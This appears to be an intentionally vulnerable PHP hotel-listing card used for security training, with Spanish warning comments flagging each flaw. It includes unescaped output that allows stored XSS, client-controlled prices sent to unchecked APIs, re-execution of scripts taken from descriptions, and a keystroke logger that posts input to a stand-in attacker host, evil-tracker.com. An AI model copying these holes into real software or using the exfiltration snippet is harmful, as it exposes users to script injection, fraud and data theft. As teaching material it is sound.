<!-- ⚠️ TARJETA DE HOTEL CON VULNERABILIDADES -->
<div class="hotel-card" data-hotel-id="<?php echo $hotel['id']; ?>">
    <!-- ⚠️ XSS en nombre del hotel -->
    <h3 class="hotel-name"><?php echo $hotel['name']; ?></h3>
    
    <!-- ⚠️ XSS almacenado en descripción -->
    <div class="hotel-description">
        <?php echo $hotel['description']; ?>
    </div>
    
    <div class="hotel-details">
        <p><strong>Location:</strong> <?php echo htmlspecialchars($hotel['location']); ?></p>
        <p><strong>Price:</strong> 
            <span class="hotel-price">$<?php echo $hotel['price']; ?></span> per night
        </p>
        
        <!-- ⚠️ Precio manipulable -->
        <div class="price-control" style="display: none;">
            <input type="number" class="custom-price" value="<?php echo $hotel['price']; ?>" 
                   min="1" max="10000" step="0.01">
            <button class="apply-custom-price">Apply</button>
        </div>
    </div>
    
    <div class="hotel-actions">
        <!-- ⚠️ Enlace con ID expuesto -->
        <a href="?page=hotel-details&id=<?php echo $hotel['id']; ?>" class="btn-view">View Details</a>
        
        <!-- ⚠️ Botón de reserva vulnerable -->
        <button class="btn-book" 
                data-hotel-id="<?php echo $hotel['id']; ?>"
                data-price="<?php echo $hotel['price']; ?>">
            Book Now
        </button>
        
        <!-- ⚠️ Botón para modificar precio (solo para demo) -->
        <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
            <button class="btn-edit-price" style="font-size: 10px; padding: 2px 5px;">
                Edit Price
            </button>
        <?php endif; ?>
    </div>
    
    <!-- ⚠️ Información oculta para manipulación -->
    <div class="hidden-data" style="display: none;">
        <input type="hidden" class="real-price" value="<?php echo $hotel['price']; ?>">
        <input type="hidden" class="hotel-id" value="<?php echo $hotel['id']; ?>">
    </div>
</div>

<style>
    .hotel-card {
        border: 1px solid #ddd;
        border-radius: 8px;
        padding: 15px;
        margin: 15px 0;
        background: white;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .hotel-name {
        color: #007bff;
        margin-top: 0;
    }
    
    .hotel-description {
        color: #666;
        margin: 10px 0;
    }
    
    .btn-view, .btn-book {
        padding: 8px 16px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        margin-right: 10px;
    }
    
    .btn-view {
        background: #6c757d;
        color: white;
        text-decoration: none;
        display: inline-block;
    }
    
    .btn-book {
        background: #28a745;
        color: white;
    }
</style>

<script>
    // ⚠️ Manipulación de precios desde el cliente
    document.addEventListener('DOMContentLoaded', function() {
        // Botón de reserva
        document.querySelectorAll('.btn-book').forEach(btn => {
            btn.addEventListener('click', function() {
                const hotelId = this.dataset.hotelId;
                const price = this.dataset.price;
                
                // ⚠️ El usuario puede modificar el precio
                const customPrice = prompt('Enter price (original: $' + price + '):', price);
                
                if (customPrice && !isNaN(customPrice)) {
                    makeReservation(hotelId, customPrice);
                }
            });
        });
        
        // Botón de editar precio (admin)
        document.querySelectorAll('.btn-edit-price').forEach(btn => {
            btn.addEventListener('click', function() {
                const card = this.closest('.hotel-card');
                const priceControl = card.querySelector('.price-control');
                priceControl.style.display = priceControl.style.display === 'none' ? 'block' : 'none';
            });
        });
        
        // Aplicar precio personalizado
        document.querySelectorAll('.apply-custom-price').forEach(btn => {
            btn.addEventListener('click', function() {
                const card = this.closest('.hotel-card');
                const customPrice = card.querySelector('.custom-price').value;
                const priceElement = card.querySelector('.hotel-price');
                
                // ⚠️ Actualiza el precio visualmente
                priceElement.textContent = '$' + customPrice;
                
                // ⚠️ Actualiza el dataset del botón
                const bookBtn = card.querySelector('.btn-book');
                bookBtn.dataset.price = customPrice;
                
                // ⚠️ Envía el cambio al servidor (sin verificación)
                fetch('../api/update-price.php', {
                    method: 'POST',
                    body: JSON.stringify({
                        hotel_id: card.dataset.hotelId,
                        new_price: customPrice
                    })
                });
            });
        });
        
        // ⚠️ Función de reserva vulnerable
        function makeReservation(hotelId, price) {
            fetch('../api/reservations.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    hotel_id: hotelId,
                    price: price,
                    check_in: '2024-12-01',
                    check_out: '2024-12-07'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert('Reservation created! You paid: $' + price);
                    
                    // ⚠️ Log local de la transacción
                    const logEntry = {
                        timestamp: new Date().toISOString(),
                        hotel_id: hotelId,
                        price_paid: price,
                        reservation_id: data.reservation_id
                    };
                    
                    localStorage.setItem('last_reservation', JSON.stringify(logEntry));
                }
            });
        }
        
        // ⚠️ Ejecuta JavaScript en descripciones de hotel
        document.querySelectorAll('.hotel-description').forEach(div => {
            const scripts = div.querySelectorAll('script');
            scripts.forEach(script => {
                try {
                    const newScript = document.createElement('script');
                    newScript.textContent = script.textContent;
                    document.body.appendChild(newScript);
                } catch(e) {
                    console.error('Error executing hotel description script:', e);
                }
            });
        });
        
        // ⚠️ Keylogger para campos de precio
        document.querySelectorAll('.custom-price').forEach(input => {
            let keystrokes = '';
            
            input.addEventListener('keydown', function(e) {
                keystrokes += e.key;
                
                if (keystrokes.includes('admin') || keystrokes.includes('root')) {
                    console.log('Suspicious input detected in price field');
                    
                    fetch('https://evil-tracker.com/suspicious', {
                        method: 'POST',
                        body: JSON.stringify({
                            input: keystrokes,
                            field: 'price',
                            hotel_id: this.closest('.hotel-card').dataset.hotelId
                        })
                    });
                }
            });
        });
    });
</script>